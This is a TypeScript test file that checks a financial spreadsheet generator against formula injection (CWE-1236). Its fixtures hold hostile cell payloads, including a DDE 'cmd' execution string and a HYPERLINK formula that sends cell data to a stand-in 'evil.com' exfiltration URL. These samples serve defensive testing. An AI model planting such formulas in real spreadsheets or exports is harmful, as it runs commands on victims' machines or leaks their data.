import { describe, it, expect } from 'vitest';
import ExcelJS from 'exceljs';
import { generateFinancialWorkbook, sanitizeSpreadsheetText } from '../../src/spreadsheet/xlsxGenerator';
import { CanonicalFinancialDocument } from '../../src/domain/financial';
import { FinancialReconciliationReport } from '../../src/domain/processing';

describe('Spreadsheet Formula Injection Defense (CWE-1236)', () => {
  it('neutralizes dangerous formula triggers (=, +, -, @, \\t, \\r)', () => {
    expect(sanitizeSpreadsheetText('=cmd|\'/C calc\'!A0')).toBe('\'=cmd|\'/C calc\'!A0');
    expect(sanitizeSpreadsheetText('+12345')).toBe('\'+12345');
    expect(sanitizeSpreadsheetText('-2+3+cmd|\'/C calc\'!A0')).toBe('\'-2+3+cmd|\'/C calc\'!A0');
    expect(sanitizeSpreadsheetText('@SUM(1+1)*cmd')).toBe('\'@SUM(1+1)*cmd');
    expect(sanitizeSpreadsheetText('\t=dangerous')).toBe('\'\t=dangerous');
    expect(sanitizeSpreadsheetText('\r=dangerous')).toBe('\'\r=dangerous');
  });

  it('preserves safe text and defaults without prepending apostrophe', () => {
    expect(sanitizeSpreadsheetText('Normal Consulting Services')).toBe('Normal Consulting Services');
    expect(sanitizeSpreadsheetText('Acme Corporation Inc.')).toBe('Acme Corporation Inc.');
    expect(sanitizeSpreadsheetText(null)).toBe('N/A');
    expect(sanitizeSpreadsheetText(undefined)).toBe('N/A');
    expect(sanitizeSpreadsheetText('', 'fallback')).toBe('');
  });

  it('generates an Excel workbook that sanitizes malicious strings in all sheets', async () => {
    const maliciousDoc: CanonicalFinancialDocument = {
      documentId: 'doc-attack-01',
      sourceFilename: '=malicious_file.pdf',
      documentHash: 'hash123',
      documentType: 'invoice',
      invoiceNumber: '=1+1',
      documentNumber: null,
      invoiceDate: '+2024-01-01',
      dueDate: '-2024-01-31',
      purchaseOrderNumber: '@PO-99',
      referenceNumbers: ['=REF-01'],
      currency: 'USD',
      language: 'en',
      processingTimestamp: new Date().toISOString(),
      vendor: {
        name: '=cmd|\'/C calc\'!A0',
        address: '+100 Hacker Way',
        taxId: '-US999999',
        email: '@evil.com',
        phone: '=555-0199',
        contactPerson: '+Eve Hacker',
      },
      customer: {
        name: '=HYPERLINK("http://evil.com/exfil?data="&B18, "Click Me")',
        address: '-Target Corp HQ',
        taxId: '@TAX-001',
        email: '+billing@target.com',
        phone: '=12345678',
        contactPerson: '-Bob Victim',
      },
      lineItems: [
        {
          lineNumber: 1,
          description: '=cmd|\'/C calc\'!A0',
          sku: '@SKU-EVIL',
          quantity: 1,
          unit: '+ea',
          unitPrice: 100,
          discount: 0,
          taxRate: 0,
          taxAmount: 0,
          lineSubtotal: 100,
          lineTotal: 100,
        },
      ],
      totals: {
        subtotal: 100,
        discountTotal: 0,
        taxTotal: 0,
        taxesBreakdown: null,
        shippingCharges: 0,
        additionalCharges: 0,
        rounding: 0,
        grandTotal: 100,
        paidAmount: 0,
        balanceDue: 100,
      },
      payment: {
        paymentTerms: '=NET-30',
        dueDate: '+2024-01-31',
        paymentMethod: '-WIRE',
        bankDetails: {
          bankName: '@Evil Bank',
          accountNumber: '=123456789',
          routingNumber: '+987654321',
          iban: '-GB00EVIL',
          swiftBic: '=EVILBIC',
        },
        paymentReference: '=REF-ATTACK',
      },
      coverage: {
        totalPages: 1,
        processedPages: 1,
        extractedPages: [1],
        failedPages: [],
        skippedPages: [],
        extractionCompleteness: 1,
        isFullyCovered: true,
      },
    };

    const mockRecon: FinancialReconciliationReport = {
      documentId: 'doc-attack-01',
      reconciledAt: new Date().toISOString(),
      overallStatus: 'EXACT_MATCH',
      isVerified: true,
      toleranceApplied: 0.0,
      currency: 'USD',
      currencyPrecision: 2,
      lineItems: [],
      totals: {
        calculatedSubtotal: 100,
        extractedSubtotal: 100,
        subtotalVariance: 0,
        calculatedTaxTotal: 0,
        extractedTaxTotal: 0,
        taxVariance: 0,
        calculatedGrandTotal: 100,
        extractedGrandTotal: 100,
        grandTotalVariance: 0,
        calculatedBalanceDue: 100,
        extractedBalanceDue: 100,
        balanceDueVariance: 0,
        status: 'EXACT_MATCH',
        discrepancies: [],
        isVerified: true,
      },
      discrepancies: [],
      auditNotes: [],
    };

    const buffer = await generateFinancialWorkbook(maliciousDoc, mockRecon);
    const workbook = new ExcelJS.Workbook();
    await workbook.xlsx.load(buffer as unknown as Parameters<typeof workbook.xlsx.load>[0]);

    const summarySheet = workbook.getWorksheet('Document Summary')!;
    const lineSheet = workbook.getWorksheet('Line Items')!;

    // Verify vendor name was neutralized
    const vendorNameVal = summarySheet.getCell('B9').value as string;
    expect(vendorNameVal.startsWith('\'=cmd|')).toBe(true);

    // Verify customer hyperlink formula injection was neutralized
    const custNameVal = summarySheet.getCell('D9').value as string;
    expect(custNameVal.startsWith('\'=HYPERLINK')).toBe(true);

    // Verify line item description was neutralized (column 2 is Description)
    const lineDescVal = lineSheet.getRow(2).getCell(2).value as string;
    expect(lineDescVal.startsWith('\'=cmd|')).toBe(true);

    // Verify line item SKU was neutralized (column 3 is SKU)
    const lineSkuVal = lineSheet.getRow(2).getCell(3).value as string;
    expect(lineSkuVal.startsWith('\'@SKU-EVIL')).toBe(true);
  });
});
